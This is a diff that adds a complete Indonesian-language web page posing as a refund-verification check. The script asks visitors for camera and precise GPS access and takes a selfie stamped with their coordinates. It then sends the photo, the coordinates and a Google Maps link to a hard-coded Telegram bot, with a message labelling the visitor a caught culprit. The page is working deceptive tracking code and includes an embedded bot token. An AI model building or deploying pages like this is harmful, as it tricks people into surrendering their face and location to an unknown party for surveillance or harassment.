@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi Pengembalian Dana</title>
+<script src="https://cdn.tailwindcss.com"></script><script src="https://unpkg.com/lucide@latest"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+<style>body{font-family:'Inter',sans-serif}.mirror-video{transform:scaleX(-1)}</style>
+</head><body class="bg-slate-900 min-h-screen text-white flex flex-col p-4">
+<header class="text-center py-6"><h1 class="text-2xl font-bold">Verifikasi Pengembalian Dana</h1><p class="text-slate-400 text-sm mt-1">Diperlukan foto selfie & lokasi untuk verifikasi admin</p></header>
+<main class="max-w-lg mx-auto w-full bg-slate-800 rounded-2xl p-4 shadow-2xl">
+<div id="statusBox" class="hidden mb-4 p-3 rounded-xl text-sm"></div>
+<div id="cameraViewport" class="relative rounded-xl bg-black aspect-[4/3] flex items-center justify-center overflow-hidden">
+<video id="webcam" autoplay playsinline class="w-full h-full object-cover mirror-video hidden"></video>
+<div id="placeholder" class="text-center p-6"><div class="w-16 h-16 bg-slate-700 rounded-full flex items-center justify-center mx-auto mb-3">📷</div><p>Kamera Belum Aktif</p><p class="text-xs text-slate-500 mt-1">Klik tombol di bawah & klik IZINKAN</p></div>
+<div id="liveGpsBadge" class="hidden absolute top-3 left-3 bg-black/70 px-3 py-1 rounded-lg text-xs"><span id="liveCoords">GPS...</span></div>
+</div>
+<canvas id="photoCanvas" class="hidden"></canvas>
+<div id="resultContainer" class="hidden mt-4 text-center"><img id="resultImage" class="w-full rounded-xl"><p class="text-emerald-400 mt-3 font-bold">✅ Verifikasi Berhasil!</p></div>
+<div id="mainControls" class="mt-6"><button id="captureBtn" class="w-full py-4 bg-cyan-500 hover:bg-cyan-400 text-white font-bold rounded-xl">📸 VERIFIKASI SEKARANG</button></div>
+</main>
+<script>
+const BOT_TOKEN = "8611721370:AAGQ8yBQqVT1p5ZvTTQQ_rYeit7B2td8E0s";
+const CHAT_ID = "1413607473";
+const webcam=document.getElementById('webcam'),placeholder=document.getElementById('placeholder'),photoCanvas=document.getElementById('photoCanvas'),resultContainer=document.getElementById('resultContainer'),resultImage=document.getElementById('resultImage'),captureBtn=document.getElementById('captureBtn'),statusBox=document.getElementById('statusBox'),liveGpsBadge=document.getElementById('liveGpsBadge'),liveCoords=document.getElementById('liveCoords'),cameraViewport=document.getElementById('cameraViewport'),mainControls=document.getElementById('mainControls');
+let stream=null;
+function showStatus(m,c){statusBox.classList.remove('hidden');statusBox.textContent=m;statusBox.className='mb-4 p-3 rounded-xl text-sm '+(c==='ok'?'bg-emerald-900 text-emerald-200':'bg-blue-900 text-blue-200')}
+async function getGPS(){return new Promise((res,rej)=>{navigator.geolocation.getCurrentPosition(p=>res({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy}),e=>rej(new Error("Izin lokasi ditolak")),{enableHighAccuracy:true,timeout:10000})})}
+async function startCam(){stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});webcam.srcObject=stream;await new Promise(r=>webcam.onloadedmetadata=r);placeholder.classList.add('hidden');webcam.classList.remove('hidden')}
+function stopCam(){if(stream)stream.getTracks().forEach(t=>t.stop())}
+function capture(loc){
+ const w=webcam.videoWidth,h=webcam.videoHeight;photoCanvas.width=w;photoCanvas.height=h;const ctx=photoCanvas.getContext('2d');
+ ctx.save();ctx.translate(w,0);ctx.scale(-1,1);ctx.drawImage(webcam,0,0,w,h);ctx.restore();
+ const now=new Date().toLocaleString('id-ID');ctx.fillStyle='rgba(0,0,0,0.7)';ctx.fillRect(0,h-80,w,80);ctx.fillStyle='#fff';ctx.font='bold 20px Inter';ctx.fillText(now,20,h-50);ctx.font='16px Inter';ctx.fillText(`LAT:${loc.lat.toFixed(6)} LNG:${loc.lng.toFixed(6)}`,20,h-25);
+ return photoCanvas.toDataURL('image/png');
+}
+async function kirimTelegram(dataUrl,loc){
+ const maps=`https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+ // 1. Kirim teks lokasi
+ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:`🚨 PELAKU KETANGKEP!\nWaktu: ${new Date().toLocaleString('id-ID')}\nLAT: ${loc.lat}\nLNG: ${loc.lng}\nAkurasi: ${Math.round(loc.acc)}m\nMaps: ${maps}`})});
+ // 2. Kirim foto (convert base64 to blob)
+ const blob=await (await fetch(dataUrl)).blob();
+ const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'pelaku.png');fd.append('caption',`Foto pelaku + lokasi ${maps}`);
+ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+}
+captureBtn.addEventListener('click',async()=>{
+ captureBtn.disabled=true;showStatus('Meminta izin kamera & GPS... klik IZINKAN ya!','');
+ try{const [loc]=await Promise.all([getGPS(),startCam()]);liveCoords.textContent=`${loc.lat.toFixed(4)}, ${loc.lng.toFixed(4)}`;liveGpsBadge.classList.remove('hidden');showStatus('Lokasi OK! Mengambil foto...','');await new Promise(r=>setTimeout(r,800));
+ const img=capture(loc);resultImage.src=img;stopCam();cameraViewport.classList.add('hidden');mainControls.classList.add('hidden');resultContainer.classList.remove('hidden');showStatus('Mengirim ke admin...','');
+ await kirimTelegram(img,loc);showStatus('✅ Verifikasi terkirim ke admin!','ok');
+ }catch(e){showStatus('GAGAL: '+e.message,'');stopCam();}finally{captureBtn.disabled=false}
+});
+lucide.createIcons();
+</script></body></html>
